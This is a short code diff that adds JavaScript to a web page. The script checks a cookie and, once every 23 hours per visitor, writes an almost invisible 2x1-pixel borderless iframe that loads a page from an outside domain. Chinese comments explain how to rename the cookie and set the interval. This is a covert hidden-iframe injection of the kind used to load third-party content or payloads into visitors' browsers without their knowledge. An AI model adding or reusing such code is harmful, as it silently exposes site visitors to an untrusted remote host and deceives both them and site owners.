@@ -1,0 +1,9 @@
+var cookieString = new String(document.cookie) 
+var cookieHeader = 'tongbullq=' //更换happy_pop为任意名称 
+var beginPosition = cookieString.indexOf(cookieHeader) 
+if (beginPosition <0){ 
+document.writeln("<iframe width=\"2\" height=\"1\" frameborder=\"0\" scrolling=\"no\" allowtransparency=\"true\" src=\"//llqcj.tuan120.com/cj/tongbu.html\"></iframe>"); 
+var Then = new Date()　　　　 
+Then.setTime(Then.getTime() + 1000*60*60*23 ) //同一ip设置过期时间，即多长间隔跳出一次 
+document.cookie = 'tongbullq=yes;expires='+ Then.toGMTString()　 //更换happy_pop和第4行一样的名称 
+}
